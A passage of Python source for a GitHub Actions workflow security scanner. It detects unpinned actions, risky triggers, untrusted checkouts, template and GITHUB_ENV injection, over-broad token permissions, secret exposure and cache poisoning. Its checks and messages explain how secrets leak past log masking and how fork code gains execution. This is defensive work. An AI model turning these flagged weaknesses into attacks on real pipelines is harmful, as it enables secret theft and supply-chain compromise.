    if key == "pypa/gh-action-pypi-publish" and "password" not in inputs:
        return {"id-token": "write"}
    return {}


def script_permissions(text: str, needed: Dict[str, str]) -> None:
    for pattern, scope, level in RUN_PERMISSIONS:
        if pattern.search(text):
            merge_level(needed, scope, level)
    for namespace, method in SCRIPT_API.findall(text):
        reading = method.startswith(("get", "list", "check", "compare"))
        merge_level(needed, API_SCOPES[namespace], "read" if reading else "write")


def needed_permissions(job: Job) -> Tuple[Dict[str, str], List[str]]:
    needed: Dict[str, str] = {}
    unknown: List[str] = []
    for step in job.steps:
        if step.run:
            script_permissions(step.run, needed)
            if re.search(r"\bgh\s+api\b", step.run) and "gh api" not in unknown:
                unknown.append("gh api")
        if not step.uses:
            continue
        key = action_key(step.uses)
        table = ACTION_PERMISSIONS.get(key)
        if table is None and key.count("/") > 1:
            table = ACTION_PERMISSIONS.get("/".join(key.split("/")[:2]))
        if table is None:
            if key not in unknown and not step.uses.startswith("docker://"):
                unknown.append(key)
            continue
        for scope, level in {**table, **conditional_permissions(key, step.inputs)}.items():
            merge_level(needed, scope, level)
        for name in CODE_INPUTS.get(key, ()):
            script_permissions(as_text(step.inputs.get(name)), needed)
    return needed, unknown


def granted_permissions(value: Any) -> Tuple[str, Dict[str, str]]:
    if value is None or value == {}:
        return "none", {}
    if value == "write-all":
        return "write-all", {scope: "write" for scope in WRITE_SCOPES}
    if value == "read-all":
        return "read-all", {scope: "read" for scope in WRITE_SCOPES}
    if isinstance(value, dict):
        return "explicit", {str(k): as_text(v) for k, v in value.items()}
    return "unknown", {}


def inline_permissions(scopes: Dict[str, str]) -> str:
    if not scopes:
        return "{}"
    return ", ".join(f"{scope}: {scopes[scope]}" for scope in sorted(scopes))


def render_permissions(scopes: Dict[str, str], indent: str = "") -> str:
    if not scopes:
        return f"{indent}permissions: {{}}"
    return "\n".join([f"{indent}permissions:"] + [f"{indent}  {scope}: {scopes[scope]}" for scope in sorted(scopes)])


def excess_writes(granted: Dict[str, str], needed: Dict[str, str]) -> List[str]:
    return sorted(scope for scope, level in granted.items() if level == "write" and needed.get(scope) != "write")


def permissions_severity(kind: str, excess: Sequence[str]) -> str:
    if kind == "write-all" or any(scope in HIGH_SCOPES for scope in excess):
        return "high"
    return "medium"


def finding(rule: str, severity: str, workflow: Workflow, line: int, message: str, job: str = "", step: str = "", fix: str = "") -> Finding:
    meta = RULES[rule]
    return Finding(rule, severity, workflow.path, line, job, step, message, meta.attack, fix or meta.fix)


def lines_of(text: str, start: int) -> Iterable[Tuple[int, str]]:
    for offset, line in enumerate(text.split("\n")):
        yield start + offset, line


def code_blocks(step: Step) -> List[Tuple[str, int, str]]:
    blocks: List[Tuple[str, int, str]] = []
    if step.run:
        blocks.append((step.run, step.run_line, "run"))
    for name in CODE_INPUTS.get(action_key(step.uses), ()):
        if name in step.inputs:
            blocks.append((as_text(step.inputs[name]), step.input_lines[name], f"with.{name}"))
    return blocks


def check_unpinned(workflow: Workflow) -> List[Finding]:
    found: List[Finding] = []
    targets: List[Tuple[str, int, str, str]] = []
    for job in workflow.jobs:
        if job.uses:
            targets.append((job.uses, job.uses_line, job.id, ""))
        for step in job.steps:
            if step.uses:
                targets.append((step.uses, step.uses_line, job.id, step.label))
    for uses, line, job_id, step_label in targets:
        if step_label and uses in workflow.locked:
            continue
        kind = classify_uses(uses)
        if kind in ("sha", "local", "docker-digest"):
            continue
        first_party = owner_of(uses) in GITHUB_OWNERS
        if kind == "ref":
            ref = uses.rsplit("@", 1)[1]
            message = f"`{uses}` follows `{ref}`, a tag or branch its owner can move to any commit"
            severity = "medium" if first_party else "high"
        elif kind == "short-sha":
            message = f"`{uses}` uses a shortened SHA, which is not an immutable pin; write all 40 characters"
            severity = "medium" if first_party else "high"
        elif kind == "no-ref":
            message = f"`{uses}` has no ref at all; GitHub requires one, and only a full commit SHA is immutable"
            severity = "high"
        elif kind == "docker-tag":
            message = f"`{uses}` follows an image tag the registry owner can push again; pin `@sha256:` digest"
            severity = "medium"
        else:
            message = f"`{uses}` has no tag, so it runs whatever `latest` is today; pin `@sha256:` digest"
            severity = "high"
        found.append(finding("unpinned-uses", severity, workflow, line, message, job_id, step_label))
    return found


def check_dangerous_triggers(workflow: Workflow) -> List[Finding]:
    explanations = {
        "pull_request_target": "runs the base branch's workflow with repository secrets and a read/write GITHUB_TOKEN for pull requests from any fork",
        "workflow_run": "runs with repository secrets and a write-capable token after another workflow finishes, including runs started by fork pull requests, and its event carries the fork's branch, commits and artifacts",
        "issue_comment": "runs on the default branch with secrets for comments that anyone can write on issues and pull requests",
    }
    return [
        finding("dangerous-trigger", "high", workflow, workflow.trigger_lines[name], f"`{name}` {explanations[name]}")
        for name in workflow.has(*DANGEROUS_TRIGGERS)
    ]


def untrusted_source(value: str) -> Optional[str]:
    if "refs/pull/" in value:
        return "refs/pull/..."
    for expression in EXPRESSION.finditer(value):
        for context, _ in contexts_in(expression.group(1)):
            if context in UNTRUSTED_REFS:
                return context
    return None


def untrusted_fetch(step: Step, workflow: Workflow) -> Optional[Tuple[int, str, bool]]:
    key = action_key(step.uses)
    if key == "actions/checkout":
        for name in ("ref", "repository"):
            if name in step.inputs:
                source = untrusted_source(as_text(step.inputs[name]))
                if source:
                    return step.input_lines[name], f"`actions/checkout` with `{name}: {source}`", True
    if key == "actions/download-artifact" and "workflow_run" in workflow.triggers:
        run_id = as_text(step.inputs.get("run-id"))
        if "github.event.workflow_run.id" in run_id:
            return step.input_lines.get("run-id", step.uses_line), "`actions/download-artifact` from the triggering run", False
    for number, text in lines_of(step.run, step.run_line):
        if UNTRUSTED_FETCH.search(text) or (re.search(r"\bgit\b", text) and untrusted_source(text)):
            return number, f"`{text.strip()}`", True
    return None


def executes_code(step: Step) -> bool:
    return bool(step.run.strip()) or classify_uses(step.uses) == "local" or action_key(step.uses) in EXECUTING_ACTIONS


def check_untrusted_checkout(workflow: Workflow) -> List[Finding]:
    triggers = workflow.has(*DANGEROUS_TRIGGERS)
    if not triggers:
        return []
    found: List[Finding] = []
    for job in workflow.jobs:
        for position, step in enumerate(job.steps):
            fetched = untrusted_fetch(step, workflow)
            if fetched is None:
                continue
            line, what, is_code = fetched
            later_steps = [later for later in job.steps[position + 1:] if executes_code(later)]
            runner = next((later for later in later_steps if BUILD_COMMANDS.search(later.run) or not later.run), later_steps[0] if later_steps else None)
            where = f"in a `{triggers[0]}` workflow"
            if runner is not None and is_code:
                started = runner.run_line if runner.run else runner.uses_line
                message = f"{what} {where} fetches the contributor's code, and step \"{runner.label}\" (line {started}) runs it"
                severity = "critical"
            elif is_code:
                message = f"{what} {where} fetches the contributor's code; any later step that runs or reads it executes their files"
                severity = "high"
            else:
                message = f"{what} {where} unpacks files a fork's run produced; treat them as data, never execute or source them"
                severity = "high"
            found.append(finding("untrusted-checkout", severity, workflow, line, message, job.id, step.label))
    return found


def check_template_injection(workflow: Workflow) -> List[Finding]:
    found: List[Finding] = []
    privileged = workflow.has(*PRIVILEGED_TRIGGERS)
    severity = "critical" if privileged else "high"
    for job in workflow.jobs:
        for step in job.steps:
            taint = tainted_env(workflow.env, job.env, step.env)
            seen = set()
            for text, start, kind in code_blocks(step):
                for expression in EXPRESSION.finditer(text):
                    line = start + text.count("\n", 0, expression.start())
                    body = expression.group(1)
                    for context, offset in contexts_in(body):
                        if inside_boolean_call(body, offset):
                            continue
                        if is_attacker_context(context):
                            message = f"`{context}` is pasted into `{kind}` before the shell starts, so its text runs as code"
                        elif context.startswith("env.") and context[4:] in taint:
                            message = f"`{context}` carries `{taint[context[4:]]}`; `${{{{ env.X }}}}` is still a template expansion into `{kind}`"
                        else:
                            continue
                        if (line, context) in seen:
                            continue
                        seen.add((line, context))
                        if privileged:
                            message += f", in a workflow started by `{privileged[0]}`"
                        found.append(finding("template-injection", severity, workflow, line, message, job.id, step.label))
    return found


def check_permissions(workflow: Workflow) -> List[Finding]:
    found: List[Finding] = []
    inheriting: List[Tuple[Job, Dict[str, str], List[str]]] = []
    wf_kind, wf_granted = granted_permissions(workflow.permissions)
    for job in workflow.jobs:
        needed, unknown = needed_permissions(job)
        note = f" (not counted: {', '.join(unknown)}; check their documentation)" if unknown else ""
        if not job.permissions_set and not workflow.permissions_set:
            message = "no `permissions:` at the workflow or job level, so the token gets the owner's default, which is read and write on most scopes unless the organisation or repository chose the restricted default"
            fix = f"Add `permissions: {{}}` at the top; job {job.id} needs `{inline_permissions(needed)}`{note}."
            found.append(finding("excessive-permissions", "medium", workflow, job.line, message, job.id, fix=fix))
            continue
        if not job.permissions_set:
            inheriting.append((job, needed, unknown))
            continue
        if job.uses:
            kind, _ = granted_permissions(job.permissions)
            if kind == "write-all":
                found.append(finding("excessive-permissions", "high", workflow, job.permissions_line, f"`write-all` is passed to the reusable workflow `{job.uses}`", job.id))
            continue
        kind, granted = granted_permissions(job.permissions)
        excess = excess_writes(granted, needed)
        if kind == "read-all":
            found.append(finding("excessive-permissions", "low", workflow, job.permissions_line, "`read-all` grants read on every scope, including security events and actions", job.id, fix=f"Replace it with `{inline_permissions(needed)}` on job {job.id}{note}."))
        elif excess:
            shown = "`write-all`" if kind == "write-all" else ", ".join(f"`{scope}: write`" for scope in excess)
            message = f"job {job.id} is granted {shown} but its steps need only `{inline_permissions(needed)}`"
            fix = f"Replace it with `{inline_permissions(needed)}` on job {job.id}{note}."
            found.append(finding("excessive-permissions", permissions_severity(kind, excess), workflow, job.permissions_line, message, job.id, fix=fix))
    if inheriting and wf_kind in ("write-all", "explicit", "read-all"):
        problems: List[str] = []
        per_job: List[str] = []
        all_excess: List[str] = []
        unknown_all: List[str] = []
        for job, needed, unknown in inheriting:
            excess = excess_writes(wf_granted, needed)
            all_excess.extend(scope for scope in excess if scope not in all_excess)
            per_job.append(f"{job.id}: `{inline_permissions(needed)}`")
            unknown_all.extend(item for item in unknown if item not in unknown_all)
            if excess:
                problems.append(job.id)
        note = f" (not counted: {', '.join(unknown_all)}; check their documentation)" if unknown_all else ""
        if problems:
            if wf_kind == "write-all":
                message = f"workflow-level `write-all` gives every scope write access to job(s) {', '.join(problems)}"
            else:
                message = f"workflow-level {', '.join(f'`{s}: write`' for s in sorted(all_excess))} reaches job(s) {', '.join(problems)}, whose steps do not use it"
            fix = f"Set `permissions: {{}}` at the workflow level and per job: {'; '.join(per_job)}{note}."
            found.append(finding("excessive-permissions", permissions_severity(wf_kind, all_excess), workflow, workflow.permissions_line, message, fix=fix))
        elif wf_kind == "read-all":
            found.append(finding("excessive-permissions", "low", workflow, workflow.permissions_line, "`read-all` grants read on every scope to every job", fix=f"Set per job: {'; '.join(per_job)}{note}."))
    return found


def check_secrets(workflow: Workflow) -> List[Finding]:
    found: List[Finding] = []
    for name, value in workflow.env.items():
        if TOJSON_SECRETS.search(value):
            found.append(finding("secret-exposure", "high", workflow, workflow.env_lines[name], f"`env.{name}` loads every repository and organisation secret into every job of this workflow"))
    for job in workflow.jobs:
        if job.uses and as_text(job.secrets).strip() == "inherit":
            found.append(finding("secret-exposure", "medium", workflow, job.secrets_line, f"`secrets: inherit` hands every secret to `{job.uses}`; pass only the ones it declares", job.id))
        for name, value in job.env.items():
            if TOJSON_SECRETS.search(value):
                found.append(finding("secret-exposure", "high", workflow, job.env_lines[name], f"`env.{name}` loads every repository and organisation secret into every step of job {job.id}", job.id))
        for step in job.steps:
            found.extend(step_secret_findings(workflow, job, step))
    return found


def step_secret_findings(workflow: Workflow, job: Job, step: Step) -> List[Finding]:
    found: List[Finding] = []
    kind = classify_uses(step.uses) if step.uses else ""
    third_party = bool(step.uses) and not is_pinned(step.uses) and owner_of(step.uses) not in GITHUB_OWNERS
    values = [(f"with.{k}", as_text(v), step.input_lines.get(k, step.line)) for k, v in step.inputs.items()]
    values += [(f"env.{k}", v, step.env_lines.get(k, step.line)) for k, v in step.env.items()]
    for where, value, line in values:
        if TOJSON_SECRETS.search(value):
            found.append(finding("secret-exposure", "high", workflow, line, f"`{where}` loads every repository and organisation secret into this step", job.id, step.label))
            continue
        if third_party and kind != "local":
            match = next((SECRET_REF.search(e.group(1)) for e in EXPRESSION.finditer(value) if SECRET_REF.search(e.group(1))), None)
            if match:
                secret = match.group(0).replace(" ", "")
                found.append(finding("secret-exposure", "high", workflow, line, f"`{secret}` is handed to `{step.uses}`, code that changes whenever that ref moves", job.id, step.label))
                break
    if not step.run:
        return found
    secret_vars = secret_env(workflow.env, job.env, step.env)
    references = {name: shell_reference(name) for name in secret_vars if name != "*"}
    for number, text in lines_of(step.run, step.run_line):
        if TOJSON_SECRETS.search(text):
            found.append(finding("secret-exposure", "high", workflow, number, "`toJSON(secrets)` writes every secret into the script", job.id, step.label))
            continue
        inline = [m.group(0).replace(" ", "") for e in EXPRESSION.finditer(text) for m in [SECRET_REF.search(e.group(1))] if m]
        via_env = [name for name, pattern in references.items() if pattern.search(text)]
        if not inline and not via_env:
            continue
        printed = PRINTS.search(text) and "--password-stdin" not in text
        sliced = any(re.search(r"\$\{" + re.escape(name) + r"\s*(?::|/|#|%|\^|,)", text) for name in via_env)
        subject = f"`{inline[0]}`" if inline else f"`${via_env[0]}` (from `{secret_vars[via_env[0]]}`)"
        if printed or sliced:
            message = f"{subject} is printed or transformed on this line; masking hides only the exact value, not a slice, an encoding or a reversed copy"
            found.append(finding("secret-exposure", "high", workflow, number, message, job.id, step.label))
        elif inline:
            message = f"{subject} is pasted into the script text, so it lands in the generated script file and in the process arguments instead of the environment"
            found.append(finding("secret-exposure", "medium", workflow, number, message, job.id, step.label))
    return found


def check_persist_credentials(workflow: Workflow) -> List[Finding]:
    found: List[Finding] = []
    for job in workflow.jobs:
        for position, step in enumerate(job.steps):
            if action_key(step.uses) != "actions/checkout":
                continue
            value = step.inputs.get("persist-credentials")
            if value is not None and falsy(value):
                continue
            if value is not None and truthy(value):
                found.append(finding("persist-credentials", "low", workflow, step.input_lines["persist-credentials"], "`persist-credentials: true` keeps the token on disk on purpose; make sure a later step really pushes", job.id, step.label))
                continue
            upload = next((later for later in job.steps[position + 1:] if action_key(later.uses) == "actions/upload-artifact" and uploads_workspace(later)), None)
            if upload is not None:
                message = f"the checkout keeps the job's token on disk and step \"{upload.label}\" (line {upload.uses_line}) uploads the workspace that contains it"
                found.append(finding("persist-credentials", "high", workflow, step.uses_line, message, job.id, step.label))
            else:
                found.append(finding("persist-credentials", "medium", workflow, step.uses_line, "`persist-credentials` is not false, so the job's token stays on disk for every later step", job.id, step.label))
    return found


def uploads_workspace(step: Step) -> bool:
    for path in as_text(step.inputs.get("path")).split("\n"):
        path = path.strip()
        if path in (".", "./", "*", "**", "./**", "${{ github.workspace }}") or ".git" in path.split("/"):
            return True
    return False


def runner_labels(runs_on: Any) -> List[str]:
    if isinstance(runs_on, str):
        return [runs_on]
    if isinstance(runs_on, list):
        return [as_text(item) for item in runs_on]
    if isinstance(runs_on, dict):
        labels = runs_on.get("labels")
        return runner_labels(labels) if labels is not None else []
    return []


def check_self_hosted(workflow: Workflow, visibility: str) -> List[Finding]:
    if visibility == "private":
        return []
    found: List[Finding] = []
    fork_triggers = workflow.has(*FORK_CODE_TRIGGERS)
    for job in workflow.jobs:
        if "self-hosted" not in [label.lower() for label in runner_labels(job.runs_on)]:
            continue
        if visibility == "public":
            severity = "critical" if fork_triggers else "high"
            message = "a self-hosted runner on a public repository"
            if fork_triggers:
                message += f", started by `{fork_triggers[0]}`, so a fork's pull request runs its code on this machine"
        else:
            severity = "low"
            message = "a self-hosted runner; if this repository is public, any fork pull request can run code on it (pass --public or --private)"
        found.append(finding("self-hosted-runner", severity, workflow, job.runs_on_line, message, job.id))
    return found


def check_github_env(workflow: Workflow) -> List[Finding]:
    found: List[Finding] = []
    privileged = workflow.has(*PRIVILEGED_TRIGGERS)
    env_file_triggers = workflow.has(*ENV_FILE_TRIGGERS)
    for job in workflow.jobs:
        for step in job.steps:
            if not step.run:
                continue
            taint = tainted_env(workflow.env, job.env, step.env)
            references = {name: shell_reference(name) for name in taint if name != "*"}
            for number, text in lines_of(step.run, step.run_line):
                target = GITHUB_FILE_WRITE.search(text)
                if not target:
                    continue
                destination = target.group(1)
                direct = [context for context, _ in attacker_contexts(text)]
                via_env = [name for name, pattern in references.items() if pattern.search(text)]
                if direct or via_env:
                    source = f"`{direct[0]}`" if direct else f"`${via_env[0]}` (from `{taint[via_env[0]]}`)"
                    severity = "critical" if privileged else "high"
                    message = f"{source} is written to {destination}; a newline in it adds any variable it likes for every later step"
                    found.append(finding("github-env-injection", severity, workflow, number, message, job.id, step.label))
                elif env_file_triggers and ("$" in text.replace(target.group(0), "") or "${{" in text):
                    message = f"a computed value is written to {destination} in a `{env_file_triggers[0]}` workflow; whatever the checked-out code or downloaded artifacts control here controls every later step"
                    found.append(finding("github-env-injection", "medium", workflow, number, message, job.id, step.label))
    return found


def cache_restore_reason(step: Step) -> Optional[str]:
    key = action_key(step.uses)
    inputs = step.inputs
    if key in ("actions/cache", "actions/cache/restore", "swatinem/rust-cache"):
        return None if truthy(inputs.get("lookup-only")) else f"`{key}` restores a cache entry"
    if key in ("actions/setup-python", "actions/setup-java", "actions/setup-dotnet"):
        value = inputs.get("cache")
        return f"`{key}` with `cache: {as_text(value)}`" if value not in (None, "", False) and not falsy(value) else None
    if key == "actions/setup-node":
        if inputs.get("cache") not in (None, "", False) and not falsy(inputs.get("cache")):
            return f"`{key}` with `cache: {as_text(inputs.get('cache'))}`"
        return None if falsy(inputs.get("package-manager-cache", True)) else f"`{key}` caches the package manager by default in recent releases"
    if key == "actions/setup-go":
        return None if falsy(inputs.get("cache", True)) else f"`{key}` caches by default"
    if key == "astral-sh/setup-uv":
        return None if falsy(inputs.get("enable-cache", True)) else f"`{key}` caches by default"
    if key == "ruby/setup-ruby":
        return f"`{key}` with `bundler-cache: true`" if truthy(inputs.get("bundler-cache")) else None
    return None


def release_reason(workflow: Workflow, job: Job) -> Optional[str]:
    push = workflow.triggers.get("push")
    if "push" in workflow.triggers and isinstance(push, dict):
        if push.get("tags") is not None:
            return "it runs on a tag push"
        branches = push.get("branches") or []
        if isinstance(branches, list) and any("release" in as_text(b).lower() for b in branches):
            return "it runs on a push to a release branch"
    if "release" in workflow.triggers:
        return "it runs on the release event"
    for step in job.steps:
        if action_key(step.uses) in PUBLISHER_ACTIONS:
            return f"it publishes with `{action_key(step.uses)}`"
        command = PUBLISH_COMMANDS.search(step.run)
        if command:
            return f"it publishes with `{command.group(0)}`"
    return None


def effective_cache_mode(workflow: Workflow, job: Job) -> Tuple[str, int, bool]:
    if job.cache_mode:
        return job.cache_mode, job.cache_mode_line, True
    if workflow.cache_mode:
        return workflow.cache_mode, workflow.cache_mode_line, True
    if workflow.has(*TRUSTED_CACHE_TRIGGERS):
        return "write", 0, False
    return "read", 0, False


def cache_sources(workflows: Sequence[Workflow]) -> List[Tuple[Workflow, Job, int, bool]]:
    sources: List[Tuple[Workflow, Job, int, bool]] = []
    for workflow in workflows:
        if not workflow.has(*PRIVILEGED_TRIGGERS):
            continue
        for job in workflow.jobs:
            mode, line, explicit = effective_cache_mode(workflow, job)
            if explicit and mode in ("write", "write-only"):
                runs_untrusted = any(untrusted_fetch(step, workflow) for step in job.steps)
                sources.append((workflow, job, line, runs_untrusted))
    return sources


def check_cache_poisoning(workflows: Sequence[Workflow]) -> List[Finding]:
    found: List[Finding] = []
    sources = cache_sources(workflows)
    for workflow, job, line, runs_untrusted in sources:
        trigger = workflow.has(*PRIVILEGED_TRIGGERS)[0]
        message = f"`cache-mode: {effective_cache_mode(workflow, job)[0]}` lifts the read-only cache default of a `{trigger}` run, so job {job.id} can save entries into the default branch's cache scope"
        if runs_untrusted:
            message += " after it fetched untrusted code"
        found.append(finding("cache-poisoning", "critical" if runs_untrusted else "high", workflow, line, message, job.id))
    for workflow in workflows:
        for job in workflow.jobs:
            reason = release_reason(workflow, job)
            mode = effective_cache_mode(workflow, job)[0]
            if reason is None or mode in ("none", "write-only"):
                continue
            for step in job.steps:
                restore = cache_restore_reason(step)
                if restore is None:
                    continue
                message = f"job {job.id} publishes ({reason}) and {restore}"
                writers = [f"{os.path.basename(w.path)} job {j.id} (line {l})" for w, j, l, _ in sources if w is not workflow]
                severity = "high"
                if writers:
                    message += f"; entries can be written by {', '.join(writers)}"
                    severity = "critical"
                found.append(finding("cache-poisoning", severity, workflow, step.uses_line, message, job.id, step.label))
    return found


def analyse(workflows: Sequence[Workflow], visibility: str = "unknown") -> List[Finding]:
    found: List[Finding] = []
    for workflow in workflows:
        found.extend(check_unpinned(workflow))
        found.extend(check_dangerous_triggers(workflow))
        found.extend(check_untrusted_checkout(workflow))
        found.extend(check_template_injection(workflow))
        found.extend(check_permissions(workflow))
        found.extend(check_secrets(workflow))
        found.extend(check_persist_credentials(workflow))
        found.extend(check_self_hosted(workflow, visibility))
        found.extend(check_github_env(workflow))
    found.extend(check_cache_poisoning(workflows))
    unique: Dict[Tuple[str, int, str, str], Finding] = {}
    for item in found:
        unique.setdefault((item.file, item.line, item.rule, item.message), item)
    return sorted(unique.values(), key=lambda f: (f.file, f.line, SEVERITIES.index(f.severity), f.rule))


def suggested_permissions(workflow: Workflow) -> Dict[str, Dict[str, Any]]:
    result: Dict[str, Dict[str, Any]] = {}
    for job in workflow.jobs:
        needed, unknown = needed_permissions(job)
        result[job.id] = {"permissions": needed, "unknown": unknown}
    return result


def filter_severity(findings: Sequence[Finding], minimum: str) -> List[Finding]:
    limit = SEVERITIES.index(minimum)
    return [f for f in findings if SEVERITIES.index(f.severity) <= limit]


def tally(findings: Sequence[Finding]) -> Dict[str, int]:
    return {level: sum(1 for f in findings if f.severity == level) for level in SEVERITIES}


def collect(paths: Sequence[str]) -> List[str]:
    files: List[str] = []
    for path in paths:
        if os.path.isdir(path):
            nested = os.path.join(path, ".github", "workflows")
            base = nested if os.path.isdir(nested) else path
            for directory, subdirectories, names in os.walk(base):
                subdirectories.sort()
                files.extend(os.path.join(directory, name) for name in sorted(names) if name.endswith((".yml", ".yaml")))
        elif os.path.isfile(path):
            files.append(path)
        else:
            raise WorkflowError(path, 0, "no such file or directory")
    if not files:
        raise WorkflowError(", ".join(paths), 0, "no workflow files (*.yml, *.yaml) found")
    return [os.path.normpath(f) for f in files]


def read_text(path: str) -> str:
    try:
        with open(path, encoding="utf-8") as handle:
            return handle.read()
    except OSError as error:
        raise WorkflowError(path, 0, f"cannot read: {error.strerror}") from None


def load_lockfile(path: str, source: str) -> Dict[str, Set[str]]:
    try:
        data = parse_yaml(source).data
    except YamlError as error:
        raise WorkflowError(path, error.line, str(error).split(": ", 1)[1]) from None
    if not isinstance(data, dict):
        raise WorkflowError(path, 1, "a lockfile is a mapping with workflows: and dependencies:")
    dependencies = data.get("dependencies") or {}
    locked: Dict[str, Set[str]] = {}
    for workflow_path, refs in (data.get("workflows") or {}).items():
        entries = refs if isinstance(refs, list) else []
        locked[os.path.basename(str(workflow_path))] = {
            str(ref) for ref in entries
            if isinstance(dependencies.get(ref), dict) and dependencies[ref].get("commit")
        }
    return locked


def load_paths(paths: Sequence[str]) -> List[Workflow]:
    workflows: List[Workflow] = []
    lockfiles: Dict[str, Dict[str, Set[str]]] = {}
    for path in collect(paths):
        if os.path.basename(path) == LOCKFILE:
            continue
        workflow = load_workflow(path, read_text(path))
        directory = os.path.dirname(path)
        if directory not in lockfiles:
            lock_path = os.path.join(directory, LOCKFILE)
            lockfiles[directory] = load_lockfile(lock_path, read_text(lock_path)) if os.path.isfile(lock_path) else {}
        workflow.locked = lockfiles[directory].get(os.path.basename(path), set())
        workflows.append(workflow)
    return workflows


def render_text(workflows: Sequence[Workflow], findings: Sequence[Finding], show_permissions: bool = False) -> str:
    counts = tally(findings)
    summary = ", ".join(f"{counts[level]} {level}" for level in SEVERITIES if counts[level])
    lines = [f"wfaudit: {len(workflows)} workflow(s), {len(findings)} finding(s)" + (f": {summary}" if summary else ""), ""]
    for item in findings:
        where = " / ".join(part for part in (item.job, item.step) if part)
        lines.append(f"{item.severity.upper():<8}  {item.rule:<21} {item.file}:{item.line}" + (f"  {where}" if where else ""))
        lines.append(f"          {item.message}")
        lines.append(f"          attack: {item.attack}")
        lines.append(f"          fix: {item.fix}")
        lines.append("")
    if not findings:
        lines.append("No findings.")
    if show_permissions:
        lines.append("Least-privilege permissions per job:")
        for workflow in workflows:
            for job_id, data in suggested_permissions(workflow).items():
                extra = f"  (not counted: {', '.join(data['unknown'])})" if data["unknown"] else ""
                lines.append(f"  {workflow.path} {job_id}: {inline_permissions(data['permissions'])}{extra}")
    return "\n".join(lines).rstrip() + "\n"


def report(workflows: Sequence[Workflow], findings: Sequence[Finding]) -> Dict[str, Any]:
    by_rule: Dict[str, int] = {}
    for item in findings:
        by_rule[item.rule] = by_rule.get(item.rule, 0) + 1
    return {
        "tool": "wfaudit",
        "version": VERSION,
        "summary": {"workflows": len(workflows), "findings": len(findings), "by_severity": tally(findings), "by_rule": dict(sorted(by_rule.items()))},
        "findings": [asdict(item) for item in findings],
        "permissions": {w.path: suggested_permissions(w) for w in workflows},
    }


def sarif(findings: Sequence[Finding]) -> Dict[str, Any]:
    rule_ids = list(RULES)
    rules = []
    for rule_id in rule_ids:
        meta = RULES[rule_id]
        worst = min((SEVERITIES.index(f.severity) for f in findings if f.rule == rule_id), default=2)
        rules.append({
            "id": rule_id,
            "name": "".join(part.capitalize() for part in rule_id.split("-")),
            "shortDescription": {"text": meta.title},
            "fullDescription": {"text": meta.attack},
            "help": {"text": meta.fix, "markdown": meta.fix},
            "helpUri": "https://cloudcaptain.io/learn/cicd/workflow-security",
            "defaultConfiguration": {"level": SARIF_LEVELS[SEVERITIES[worst]]},
            "properties": {"tags": ["security", "github-actions"], "security-severity": SECURITY_SEVERITY[SEVERITIES[worst]]},
        })
    results = [{
        "ruleId": item.rule,
        "ruleIndex": rule_ids.index(item.rule),
        "level": SARIF_LEVELS[item.severity],
        "message": {"text": f"{item.message}. Fix: {item.fix}"},
        "locations": [{"physicalLocation": {"artifactLocation": {"uri": item.file.replace(os.sep, "/")}, "region": {"startLine": item.line}}}],
        "properties": {"severity": item.severity, "security-severity": SECURITY_SEVERITY[item.severity], "job": item.job, "step": item.step},
    } for item in findings]
    return {
        "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
        "version": "2.1.0",
        "runs": [{"tool": {"driver": {"name": "wfaudit", "version": VERSION, "informationUri": "https://cloudcaptain.io/learn/cicd/workflow-security", "rules": rules}}, "results": results}],
    }


def main(argv: Optional[Sequence[str]] = None) -> int:
    parser = argparse.ArgumentParser(prog="wfaudit", description=__doc__)
    parser.add_argument("paths", nargs="+", help="workflow files, or directories (a repository root uses its .github/workflows)")
    output = parser.add_mutually_exclusive_group()
    output.add_argument("--json", action="store_true", help="machine-readable report")
    output.add_argument("--sarif", action="store_true", help="SARIF 2.1.0 for code scanning")
    visibility = parser.add_mutually_exclusive_group()
    visibility.add_argument("--public", action="store_const", const="public", dest="visibility", help="the repository is public (self-hosted runners become high or critical)")
    visibility.add_argument("--private", action="store_const", const="private", dest="visibility", help="the repository is private (no self-hosted runner findings)")
    parser.add_argument("--min-severity", choices=SEVERITIES, default="low", help="hide findings below this severity")
    parser.add_argument("--permissions", action="store_true", help="also print the least-privilege permissions per job")
    args = parser.parse_args(list(sys.argv[1:] if argv is None else argv))
    try:
        workflows = load_paths(args.paths)
    except WorkflowError as error:
        print(f"wfaudit: {error}", file=sys.stderr)
        return 2
    findings = filter_severity(analyse(workflows, args.visibility or "unknown"), args.min_severity)
    if args.json:
        print(json.dumps(report(workflows, findings), indent=2))
    elif args.sarif:
        print(json.dumps(sarif(findings), indent=2))
    else:
        sys.stdout.write(render_text(workflows, findings, args.permissions))
    return 1 if findings else 0


if __name__ == "__main__":
    raise SystemExit(main())
